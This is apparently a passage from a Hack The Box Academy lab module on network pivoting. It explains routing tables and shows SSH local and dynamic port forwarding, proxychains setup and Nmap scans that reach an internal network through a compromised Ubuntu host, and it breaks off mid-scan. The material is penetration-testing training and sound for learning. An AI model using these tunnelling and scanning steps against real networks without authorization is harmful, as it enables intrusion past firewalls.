<p>Every IPv4 address will have a corresponding <code>subnet mask</code>. If an IP address is like a phone number, the subnet mask is like the area code. Remember that the subnet mask defines the <code>network</code> &amp; <code>host</code> portion of an IP address. When network traffic is destined for an IP address located in a different network, the computer will send the traffic to its assigned <code>default gateway</code>. The default gateway is usually the IP address assigned to a NIC on an appliance acting as the router for a given LAN. In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.</p>
<hr>
<h3 id="routing">Routing</h3>
<p>It is common to think of a network appliance that connects us to the Internet when thinking about a router, but technically any computer can become a router and participate in routing. Some of the challenges we will face in this module require us to make a pivot host route traffic to another network. One way we will see this is through the use of AutoRoute, which allows our attack box to have <code>routes</code> to target networks that are reachable through a pivot host. One key defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address. Let&#39;s look at this on Pwnbox using the commands <code>netstat -r</code> or <code>ip route</code>.</p>
<p><strong>Routing Table on Pwnbox</strong></p>
<p>The Networking Behind Pivoting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netstat -r

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
<span class="hljs-section">default</span>         <span class="hljs-number">178.62</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span>     <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         UG        <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> eth0
<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.1</span>      <span class="hljs-number">255.255</span><span class="hljs-number">.254</span><span class="hljs-number">.0</span>   UG        <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> tun0
<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.0</span>      <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-number">.254</span><span class="hljs-number">.0</span>   U         <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> tun0
<span class="hljs-number">10.106</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>      <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-number">.240</span><span class="hljs-number">.0</span>   U         <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> eth1
<span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.1</span>      <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>     UG        <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> tun0
<span class="hljs-number">178.62</span><span class="hljs-number">.64</span><span class="hljs-number">.0</span>     <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-number">.192</span><span class="hljs-number">.0</span>   U         <span class="hljs-number">0</span> <span class="hljs-number">0</span>          <span class="hljs-number">0</span> eth0
</code></pre>
<p>We will notice that Pwnbox, Linux distros, Windows, and many other operating systems have a routing table to assist the system in making routing decisions. When a packet is created and has a destination before it leaves the computer, the routing table is used to decide where to send it. For example, if we are trying to connect to a target with the IP <code>10.129.10.25</code>, we could tell from the routing table where the packet would be sent to get there. It would be forwarded to a <code>Gateway</code> out of the corresponding NIC (<code>Iface</code>). Pwnbox is not using any routing protocols (EIGRP, OSPF, BGP, etc...) to learn each of those routes. It learned about those routes via its own directly connected interfaces (eth0, eth1, tun0). Stand-alone appliances designated as routers typically will learn routes using a combination of static route creation, dynamic routing protocols, and directly connected interfaces. Any traffic destined for networks not present in the routing table will be sent to the <code>default route</code>, which can also be referred to as the default gateway or gateway of last resort. When looking for opportunities to pivot, it can be helpful to look at the hosts&#39; routing table to identify which networks we may be able to reach or which routes we may need to add.</p>
<hr>
<h3 id="protocols-services-ports">Protocols, Services &amp; Ports</h3>
<p><code>Protocols</code> are the rules that govern network communications. Many protocols and services have corresponding <code>ports</code> that act as identifiers. Logical ports aren&#39;t physical things we can touch or plug anything into. They are in software assigned to applications. When we see an IP address, we know it identifies a computer that may be reachable over a network. When we see an open port bound to that IP address, we know that it identifies an application we may be able to connect to. Connecting to specific ports that a device is <code>listening</code> on can often allow us to use ports &amp; protocols that are <code>permitted</code> in the firewall to gain a foothold on the network.</p>
<p>Let&#39;s take, for example, a web server using HTTP (<code>often listening on port 80</code>). The administrators should not block traffic coming inbound on port 80. This would prevent anyone from visiting the website they are hosting. This is often a way into the network environment, <code>through the same port that legitimate traffic is passing</code>. We must not overlook the fact that a <code>source port</code> is also generated to keep track of established connections on the client-side of a connection. We need to remain mindful of what ports we are using to ensure that when we execute our payloads, they connect back to the intended listeners we set up. We will get creative with the use of ports throughout this module.</p>
<h2 id="dynamic-port-forwarding-with-ssh-and-socks-tunneling">Dynamic Port Forwarding with SSH and SOCKS Tunneling</h2>
<hr>
<h3 id="port-forwarding-in-context">Port Forwarding in Context</h3>
<p><code>Port forwarding</code> is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even <a href="https://en.wikipedia.org/wiki/SOCKS">SOCKS</a> (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.</p>
<hr>
<h3 id="ssh-local-port-forwarding">SSH Local Port Forwarding</h3>
<p>Let&#39;s take an example from the below image.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/11.png" alt=""></p>
<p>Note: Each network diagram presented in this module is designed to illustrate concepts discussed in the associated section. The IP addressing shown in the diagrams will not always match the lab environments exactly. Be sure to focus on understanding the concept, and you will find the diagrams will prove very useful! After reading this section be sure to reference the above image again to reinforce the concepts.</p>
<p>We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.</p>
<p><strong>Scanning the Pivot Target</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -<span class="hljs-built_in">sT</span> -p22,<span class="hljs-number">3306</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span>

Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span> EST
Nmap scan report for <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>12s latency).

PORT     STATE  SERVICE
<span class="hljs-number">22</span>/tcp   open   ssh
<span class="hljs-number">3306</span>/tcp closed mysql

Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.68</span> seconds
</code></pre>
<p>The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port <code>1234</code> and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won&#39;t be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port <code>3306</code>. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.</p>
<p><strong>Executing the Local Port Forward</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -L <span class="hljs-number">1234</span>:localhost:<span class="hljs-number">3306</span> ubuntu@<span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>

ubuntu@<span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>'s password: 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-91</span>-generic x86_64)

 * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span>
 * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span>
 * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span>

  System information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Thu <span class="hljs-number">24</span> Feb <span class="hljs-number">2022</span> <span class="hljs-number">05</span>:<span class="hljs-number">23</span>:<span class="hljs-number">20</span> PM UTC

  System load:             <span class="hljs-number">0.0</span>
  Usage <span class="hljs-keyword">of</span> /:              <span class="hljs-number">28.4</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB
  Memory usage:            <span class="hljs-number">34</span>%
  Swap usage:              <span class="hljs-number">0</span>%
  Processes:               <span class="hljs-number">175</span>
  Users logged <span class="hljs-keyword">in</span>:         <span class="hljs-number">1</span>
  IPv4 address <span class="hljs-keyword">for</span> ens192: <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
  IPv6 address <span class="hljs-keyword">for</span> ens192: dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:<span class="hljs-number">52</span>eb
  IPv4 address <span class="hljs-keyword">for</span> ens224: <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.129</span>

 * Super-optimized <span class="hljs-keyword">for</span> small spaces - read how we shrank the memory
   footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-keyword">to</span> make it the smallest full K8s around.

   https:<span class="hljs-comment">//ubuntu.com/blog/microk8s-memory-optimisation</span>

<span class="hljs-number">66</span> updates can be applied immediately.
<span class="hljs-number">45</span> <span class="hljs-keyword">of</span> these updates are standard security updates.
To see these additional updates run: apt list --upgradable
</code></pre>
<p>The <code>-L</code> command tells the SSH client to request the SSH server to forward all the data we send via the port <code>1234</code> to <code>localhost:3306</code> on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.</p>
<p><strong>Confirming Port Forward with Netstat</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netstat -antp | <span class="hljs-keyword">grep</span> <span class="hljs-number">1234</span>

(Not <span class="hljs-keyword">all</span> processes could <span class="hljs-keyword">be</span> identified, non-owned process info
 will not <span class="hljs-keyword">be</span> shown, you would have <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> root <span class="hljs-keyword">to</span> see it <span class="hljs-keyword">all</span>.)
tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1234</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:*               LISTEN      <span class="hljs-number">4034</span>/ssh            
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-number">1</span>:<span class="hljs-number">1234</span>                :::*                    LISTEN      <span class="hljs-number">4034</span>/ssh
</code></pre>
<p><strong>Confirming Port Forward with Nmap</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -v -sV -p1234 localhost

Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span> EST
<span class="hljs-symbol">NSE:</span> Loaded <span class="hljs-number">45</span> scripts for scanning.
Initiating Ping Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>
Scanning localhost (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>) [<span class="hljs-number">2</span> ports]
Completed Ping Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>, <span class="hljs-number">0.</span>01s elapsed (<span class="hljs-number">1</span> total hosts)
Initiating Connect Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>
Scanning localhost (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>) [<span class="hljs-number">1</span> port]
Discovered open port <span class="hljs-number">1234</span>/tcp on <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>
Completed Connect Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>, <span class="hljs-number">0.</span>01s elapsed (<span class="hljs-number">1</span> total ports)
Initiating Service scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>
Scanning <span class="hljs-number">1</span> service on localhost (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>)
Completed Service scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>, <span class="hljs-number">0.</span>12s elapsed (<span class="hljs-number">1</span> service on <span class="hljs-number">1</span> host)
<span class="hljs-symbol">NSE:</span> Script scanning <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>.
Initiating NSE <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>
Completed NSE <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>, <span class="hljs-number">0.</span>01s elapsed
Initiating NSE <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>
Completed NSE <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">18</span>, <span class="hljs-number">0.</span>00s elapsed
Nmap scan report for localhost (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>)
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>0080s latency).
Other addresses for localhost (<span class="hljs-keyword">not</span> scanned): ::<span class="hljs-number">1</span>

PORT     STATE SERVICE VERSION
<span class="hljs-number">1234</span>/tcp open  mysql   MySQL <span class="hljs-number">8.0</span><span class="hljs-meta">.28</span>-0ubuntu0<span class="hljs-meta">.20</span><span class="hljs-meta">.04</span><span class="hljs-meta">.3</span>

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results <span class="hljs-meta">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">1.18</span> seconds
</code></pre>
<p>Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the <code>local port:server:port</code> argument to your ssh command. For example, the below command forwards the apache web server&#39;s port 80 to your attack host&#39;s local port on <code>8080</code>.</p>
<p><strong>Forwarding Multiple Ports</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ ssh -L <span class="hljs-number">1234</span>:<span class="hljs-string">localhost:</span><span class="hljs-number">3306</span> -L <span class="hljs-number">8080</span>:<span class="hljs-string">localhost:</span><span class="hljs-number">80</span> ubuntu@<span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
</code></pre>
<hr>
<h3 id="setting-up-to-pivot">Setting up to Pivot</h3>
<p>Now, if you type <code>ifconfig</code> on the Ubuntu host, you will find that this server has multiple NICs:</p>
<ul>
<li>One connected to our attack host (<code>ens192</code>)</li>
<li>One communicating to other hosts within a different network (<code>ens224</code>)</li>
<li>The loopback interface (<code>lo</code>).</li>
</ul>
<p><strong>Looking for Opportunities to Pivot using ifconfig</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;
        inet6 fe80::250:56ff:feb9:52eb  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;
        ether 00:50:56:b9:52:eb  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
        RX packets<span class="hljs-number"> 35571 </span> bytes<span class="hljs-number"> 177919049 </span>(177.9 MB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 10452 </span> bytes<span class="hljs-number"> 1474767 </span>(1.4 MB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0

ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;
        ether 00:50:56:b9:a9:aa  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
        RX packets<span class="hljs-number"> 8251 </span> bytes<span class="hljs-number"> 1125190 </span>(1.1 MB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 40 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 1538 </span> bytes<span class="hljs-number"> 123584 </span>(123.5 KB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x10&lt;host&gt;
        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)
        RX packets<span class="hljs-number"> 270 </span> bytes<span class="hljs-number"> 22432 </span>(22.4 KB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 270 </span> bytes<span class="hljs-number"> 22432 </span>(22.4 KB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
</code></pre>
<p>Unlike the previous scenario where we knew which port to access, in our current scenario, we don&#39;t know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (<code>172.16.5.1-200</code>) network or the entire subnet (<code>172.16.5.0/23</code>). We cannot perform this scan directly from our attack host because it does not have routes to the <code>172.16.5.0/23</code> network. To do this, we will have to perform <code>dynamic port forwarding</code> and <code>pivot</code> our network packets via the Ubuntu server. We can do this by starting a <code>SOCKS listener</code> on our <code>local host</code> (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.</p>
<p>This is called <code>SSH tunneling</code> over <code>SOCKS proxy</code>. SOCKS stands for <code>Socket Secure</code>, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.</p>
<p>This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from <code>NAT networks</code>. SOCKS proxies are currently of two types: <code>SOCKS4</code> and <code>SOCKS5</code>. SOCKS4 doesn&#39;t provide any authentication and UDP support, whereas SOCKS5 does provide that. Let&#39;s take an example of the below image where we have a NAT&#39;d network of 172.16.5.0/23, which we cannot access directly.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/22.png" alt=""></p>
<p>In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on <code>localhost:9050</code>. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.</p>
<p><strong>Enabling Dynamic Port Forwarding with SSH</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -D <span class="hljs-number">9050</span> ubuntu@<span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
</code></pre>
<p>The <code>-D</code> argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool&#39;s packets over the port <code>9050</code>. We can do this using the tool <code>proxychains</code>, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application&#39;s <code>TCP traffic</code> to go through hosted proxies like <code>SOCKS4</code>/<code>SOCKS5</code>, <code>TOR</code>, or <code>HTTP</code>/<code>HTTPS</code> proxies.</p>
<p>To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at <code>/etc/proxychains.conf</code>. We can add <code>socks4 127.0.0.1 9050</code> to the last line if it is not already there.</p>
<p><strong>Checking /etc/proxychains.conf</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tail <span class="hljs-number">-4</span> /etc/proxychains.conf

# meanwile
# defaults set to <span class="hljs-string">"tor"</span>
socks4     <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9050</span>
</code></pre>
<p>Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.</p>
<p><strong>Using Nmap with Proxychains</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -v -sn <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.1</span>-<span class="hljs-number">200</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)

Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">30</span> EST
Initiating Ping Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">30</span>
Scanning <span class="hljs-number">10</span> hosts [<span class="hljs-number">2</span> ports/host]
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.2</span>:<span class="hljs-number">80</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.5</span>:<span class="hljs-number">80</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.6</span>:<span class="hljs-number">80</span>-&lt;--timeout
RTTVAR has grown to over <span class="hljs-number">2.3</span> seconds, decreasing to <span class="hljs-number">2.0</span>

&lt;SNIP&gt;
</code></pre>
<p>This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called <code>SOCKS tunneling</code>. One more important note to remember here is that we can only perform a <code>full TCP connect scan</code> over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that <code>host-alive</code> checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.</p>
<p><a href="https://nmap.org/book/scan-methods-connect-scan.html">A full TCP connect scan</a> without ping on an entire network range will take a long time. So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at <code>172.16.5.19</code>.</p>
<p>We will perform a remote system scan using the below command.</p>
<p><strong>Enumerating the Windows Target through Proxychains</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -v -Pn -<span class="hljs-built_in">sT</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">'up'</span> <span class="hljs-keyword">and</span> scan <span class="hljs-built_in">times</span> may be slower.
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">33</span> EST
Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">33</span>
Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">33</span>, <span class="hljs-number">0.</span>15s elapsed
Initiating Connect Scan <span class="hljs-meta">at</span> <span class="hljs-number">12</span>:<span class="hljs-number">33</span>
Scanning <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> [<span class="hljs-number">1000</span> ports]
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">1720</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">587</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">445</span>-&lt;&gt;&lt;&gt;-OK
Discovered open port <span class="hljs-number">445</span>/tcp on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">8080</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">23</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">135</span>-&lt;&gt;&lt;&gt;-OK
Discovered open port <span class="hljs-number">135</span>/tcp on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
